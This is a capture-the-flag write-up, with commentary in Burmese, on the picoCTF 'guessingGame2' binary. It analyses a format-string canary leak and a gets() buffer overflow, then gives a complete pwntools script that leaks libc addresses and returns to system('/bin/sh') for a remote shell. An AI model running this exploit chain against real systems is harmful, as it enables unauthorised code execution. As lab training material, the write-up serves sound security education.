

```
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/guessingGame2/vuln
Arch:     i386
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No

```

Full RELRO - ဆိုတော့ ငါတို့ GOT overwrite လုပ်လို့မရဘူး ပြီးရင် got address တွေက program စကတည်းကသတ်မှတ်ပေးထားတယ်
Canary found - buffer overflow protection ရှိတယ်
NX enabled  - shell injection လုပ်လို့မရ
No PIE - No PIE ဆို code address တွေ fixed ဖြစ်မယ် ROP gadget တွေရှာရလွယ်မယ်

ဆိုတော့ စလိုက်ရအောင်


#### `Program flow`

```
0x0804865f  do_stuff
0x0804876e  win
0x080487ff  main
```

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void main(void)

{
  __gid_t __rgid;
  undefined4 uVar1;
  int iVar2;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("Welcome to my guessing game!");
  uVar1 = get_version();
  printf("Version: %x\n\n",uVar1);
  do {
    do {
      iVar2 = do_stuff();
    } while (iVar2 == 0);
    win();
  } while( true );
}

```

program flow က main ကလာမယ် ပြီးရင် `do_stuff` ကိုခေါ်ပြီး random value ကို guess လုပ်ခိုင်းတယ်

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 do_stuff(void)

{
  int iVar1;
  long lVar2;
  int in_GS_OFFSET;
  undefined4 local_21c;
  char local_210 [512];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  iVar1 = get_random();
  local_21c = 0;
  puts("What number would you like to guess?");
  fgets(local_210,0x200,_stdin);
  lVar2 = atol(local_210);
  if (lVar2 == 0) {
    puts("That\'s not a valid number!");
  }
  else if (lVar2 == iVar1 % 0x1000 + 1) {
    puts("Congrats! You win! Your prize is this print statement!\n");
    local_21c = 1;
  }
  else {
    puts("Nope!\n");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    local_21c = __stack_chk_fail_local();
  }
  return local_21c;
}
```

user ဆီက input ကို number ဟုတ်မဟုတ်စစ်တယ်
ဆိုတော့ number က လွဲရင်ကျန်တာထည့်လို့မရ
guess တာမှန်ရင် win function ကို jump မယ်

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void win(void)

{
  int in_GS_OFFSET;
  char local_210 [512];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("New winner!\nName? ");
  gets(local_210);
  printf("Congrats: ");
  printf(local_210);
  puts("\n");
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}

```

name တောင်းမယ်
Congrats: လုပ်မယ်
ပြီးရင် `do_stuff` ဆီကို ထပ်သွားမယ်

#### `Vulnerabilities`

1. ဒီမှာက number guess ခိုင်းတာက limit မရှိလို့ `bruteforce` လုပ်လို့ရမယ်

```c

  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("New winner!\nName? ");
  gets(local_210);
  printf("Congrats: ");
  printf(local_210);
```
win function မှာက  user ဆီက input တောင်းပြီး `printf` မှာတစ်ခါတည်းထုတ်ပြတယ်
2. ဆိုတော့ `printf vuln` ကိုသုံးပြီး canary value ကို leak လို့ရတယ်
အဲ canary ကို buffer overflow တွေမှာသုံးမယ်

3. နောက်ပြီး gets သုံးထားတယ်ဘာမှကန့်သတ်ထားတာမရှိဘူး `bufferoverflow` လို့ရတယ်
 ငါတို့ win function ရဲ့ return address ကို overflowမယ်

ဒီမှာ flag ထုတ် ပေးတဲ့ function မရှိတော့ ` exec()` function ကိုခေါ်မှရမယ်
ဆိုတော့ ငါတို့ အရင်ဆုံး `libc` base address တွက်ဖို့ရာ
==NO PIE== ဆိုတော့ `puts` or `printf` ရဲ့  PLT address တွေက မပြောင်းလဲဘူးဆိုတော့ local မှာ down ထားတဲ့ programရဲ့ PLT addressတွေကိုသုံးပြီး
4. remote ရဲ့ `puts` or `printf` ရဲ့ GOT address ကို leak လုပ်မယ်
win ရဲ့ return address ကို puts PLT နဲ့ overwrite လုပ်မယ်
ပြီးရင် puts PLT ရဲ့ return address အဖြစ် puts PLT address နောက်ကနေ ဘဲ winထားမယ်
puts PLT ရဲ့ puts argument အဖြစ် return addressနောက်ကနေမှ  puts GOT entry address ကိုထားမယ်

ပြီးရင် ရလာတဲ့  GOT address တွေရဲ့ 3 nibbles ကိုယူပြီး `libc` version ရှာမယ်
`libc` base ကိုတွက်မယ်
5. offset သုံးပြီ exec() real address နဲ့ bin/bash address ကိုတွက်မယ်
win ရဲ့ return address ကို  exec() real address  နဲ့ overwrite လုပ်မယ်
return address အဖြစ် နောက်ကနေ ဘဲ winထားမယ်
return addressနောက်ကနေမှ argument အဖြစ် bin/bash address ကို ထားမယ်


#### `Exploit & Technique`

```python

from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("shape-facility.picoctf.net",58416)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break *0x080487ce
            continue
        ''')
    else:
        return process(elf.path)
    


def canary_leak(p):
     p.recvuntil(b"Name? ")
     p.sendline(b"%135$p")
     p.recvuntil(b"Congrats: ")
     canaryvalue = p.recvline()
     canaryvalue = canaryvalue.decode().replace("\n","")
     return canaryvalue

def bruteforce(p):
    #for i in range(-4000, 4096):
        try:
            i = -3727
            p.sendlineafter(b"What number would you like to guess?\n", str(i).encode())
            print(f"Trying number: {i}", end="\r")
            out = p.recvline().decode()
            if "Congrats!" in out:
                print(f"\n[+] Found the number: {i}")
                #p.recvuntil(b"Name? ") 
                return i
            
        except EOFError:
            print("error")
            return None    
        

def leakaddress(p, canary, n):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(elf.plt['puts'])
    payload += p32(elf.sym['win'])
    payload += p32(elf.got['puts'])
    p.sendlineafter("What number would you like to guess?\n", str(n).encode())
    p.recvuntil(b"Name? ")
    p.sendline(payload)
    
    a = p.readline()
    b = p.readline()               
    print(a.decode(), "  and "   ,b.decode())
    
    leaked_raw = p.recv(4)    
    leak_int = u32(leaked_raw) 
    
    return leak_int

def get_shell(io, canary, sys_addr, binsh_addr):
    canary = int(canary, 16)
    payload = b'A' * 512 + p32(canary) + b'B'*12
    payload += p32(sys_addr)
    payload += p32(elf.sym['win'])
    payload += p32(binsh_addr)
    io.recvuntil(b"Name? ")
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    io = start()
    num = bruteforce(io)
    canaryV = canary_leak(io)
    print(canaryV)
    #print(hex(elf.plt['printf']))
    #print(hex(elf.got['printf']))
    putsaddress = leakaddress(io, canaryV, num)
    libc_base = putsaddress - 0x067560
    sys_addr = libc_base + 0x03cf10
    binsh_addr = libc_base + 0x17b9db
    get_shell(io, canaryV, sys_addr, binsh_addr)

```

